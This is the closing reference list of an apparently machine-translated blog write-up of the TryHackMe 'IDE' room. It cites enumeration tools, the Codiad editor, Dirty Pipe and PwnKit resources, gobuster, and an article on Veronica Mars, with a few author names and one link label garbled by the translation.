class="ae kq" href="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener ugc nofollow" target="_blank">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p id="16f6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《蓝色风暴》和《403漏洞》(2021)。<em class="kp"> IDE </em>。TryHackMe。2022年3月28日检索自:<a class="ae kq" href="https://tryhackme.com/room/ide" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/ide</a></p><p id="ed81" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">编码(未注明日期)。2022年3月27日检索自:<a class="ae kq" href="http://codiad.com/" rel="noopener ugc nofollow" target="_blank">http://codiad.com/</a></p><p id="08e6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">凯勒曼，硕士(c.a. 2022)。<em class="kp">脏管道漏洞文档</em>。2022年3月28日检索:<a class="ae kq" href="https://dirtypipe.cm4all.com/" rel="noopener ugc nofollow" target="_blank">https://dirtypipe.cm4all.com/</a></p><p id="ace2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">利亚克岛(未注明)。<em class="kp"> PwnKit </em>。GitHub仓库。2022年3月28日检索自:<a class="ae kq" href="https://github.com/ly4k/PwnKit" rel="noopener ugc nofollow" target="_blank">https://github.com/ly4k/PwnKit</a></p><p id="6f84" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Mehlmauer，c .和“hytalo-bassi”(未注明)。<em class="kp"> gobuster </em>。GitHub仓库。2022年3月27日检索自:<a class="ae kq" href="https://github.com/OJ/gobuster" rel="noopener ugc nofollow" target="_blank">https://github.com/OJ/gobuster</a></p><p id="fb43" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">普利斯，C. (2019)。<em class="kp">维罗妮卡·马尔斯如何超越其众多流派</em>。极客的巢穴。2022年3月28日检索自:<a class="ae kq" href="https://www.denofgeek.com/tv/how-veronica-mars-transcended-its-many-genres/" rel="noopener ugc nofollow" target="_blank">https://www . denofgeek . com/TV/how-Veronica-mars-beyonded-its-many-genders/</a></p></div></div>    
</body>
</html>